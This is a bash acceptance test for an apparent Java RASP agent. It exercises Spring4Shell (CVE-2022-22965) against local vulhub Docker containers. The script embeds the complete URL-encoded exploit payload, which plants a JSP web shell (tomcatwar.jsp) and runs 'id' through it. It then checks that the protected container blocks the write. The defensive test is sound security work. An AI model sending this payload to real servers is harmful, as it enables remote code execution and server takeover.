#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_SPRING_WEBMVC_IMAGE:-vulhub/spring-webmvc:5.3.17}"
baseline_name="${OHMYRASP_VULHUB_SPRING_WEBMVC_BASELINE_NAME:-ohmyrasp-vulhub-spring22965-baseline}"
protected_name="${OHMYRASP_VULHUB_SPRING_WEBMVC_PROTECTED_NAME:-ohmyrasp-vulhub-spring22965-protected}"
baseline_port="${OHMYRASP_VULHUB_SPRING_WEBMVC_BASELINE_PORT:-18290}"
protected_port="${OHMYRASP_VULHUB_SPRING_WEBMVC_PROTECTED_PORT:-18291}"
host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"
baseline_dir="logs/vulhub-spring-webmvc-5.3.17-java11-baseline"
protected_dir="logs/vulhub-spring-webmvc-5.3.17-java11-protected"
protected_log="${protected_dir}/events.jsonl"
exploit_path='/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))%21%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  -e CATALINA_OPTS= \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e CATALINA_OPTS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 180); do
    status="$(curl -sS -o "/tmp/${name}.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/?name=Bob&age=25" || true)"
    if [[ "$status" =~ ^2 ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Spring WebMVC at ${port}" >&2
  exit 1
}

send_spring4shell_request() {
  local port="$1"
  local output="$2"
  curl -sS -o "$output" -w "%{http_code}" \
    -H 'suffix: %>//' \
    -H 'c1: Runtime' \
    -H 'c2: <%' \
    "http://127.0.0.1:${port}${exploit_path}" || true
}

send_log_write_request() {
  local port="$1"
  local output="$2"
  curl -sS -o "$output" -w "%{http_code}" \
    -H 'suffix: %>//' \
    -H 'c1: Runtime' \
    -H 'c2: <%' \
    "http://127.0.0.1:${port}/?pwd=j&cmd=id" || true
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

if ! grep -q '"event":"ohmyrasp-java11-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 11 startup event in Spring WebMVC protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Spring WebMVC protected startup produced a detection before the exploit request" >&2
  exit 1
fi

baseline_config_status="$(send_spring4shell_request "$baseline_port" "${baseline_dir}/spring4shell-config.response")"
protected_config_status="$(send_spring4shell_request "$protected_port" "${protected_dir}/spring4shell-config.response")"
if [[ ! "$baseline_config_status" =~ ^2 || ! "$protected_config_status" =~ ^2 ]]; then
  echo "Spring WebMVC exploit configuration returned unexpected statuses: baseline ${baseline_config_status}, protected ${protected_config_status}" >&2
  exit 1
fi

baseline_write_status=""
protected_write_status=""
for attempt in $(seq 1 20); do
  baseline_write_status="$(
    send_log_write_request "$baseline_port" "${baseline_dir}/spring4shell-write-${attempt}.response"
  )"
  protected_write_status="$(
    send_log_write_request "$protected_port" "${protected_dir}/spring4shell-write-${attempt}.response"
  )"
  if [[ ! "$baseline_write_status" =~ ^2 || ! "$protected_write_status" =~ ^2 ]]; then
    echo "Spring WebMVC exploit write returned unexpected statuses: baseline ${baseline_write_status}, protected ${protected_write_status}" >&2
    exit 1
  fi
  sleep 1
  if docker exec "$baseline_name" sh -c 'test -s /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp'; then
    break
  fi
done

if ! docker exec "$baseline_name" sh -c 'test -s /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp'; then
  echo "baseline Spring WebMVC did not write tomcatwar.jsp" >&2
  exit 1
fi
baseline_shell_status="$(
  curl -sS -o "${baseline_dir}/webshell.response" -w "%{http_code}" \
    "http://127.0.0.1:${baseline_port}/tomcatwar.jsp?pwd=j&cmd=id" || true
)"
if [[ "$baseline_shell_status" != "200" ]] || ! grep -q 'uid=' "${baseline_dir}/webshell.response"; then
  cat "${baseline_dir}/webshell.response" >&2 || true
  echo "baseline Spring WebMVC webshell did not execute id" >&2
  exit 1
fi

if docker exec "$protected_name" sh -c 'test -e /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp'; then
  echo "protected Spring WebMVC wrote tomcatwar.jsp despite Java11 RASP" >&2
  exit 1
fi
if ! grep -q '"algorithm":"java11_file_script_write".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java11_file_script_write block event for Spring WebMVC CVE-2022-22965" >&2
  exit 1
fi

echo "vulhub Spring WebMVC 5.3.17 CVE-2022-22965 Java11 acceptance passed"
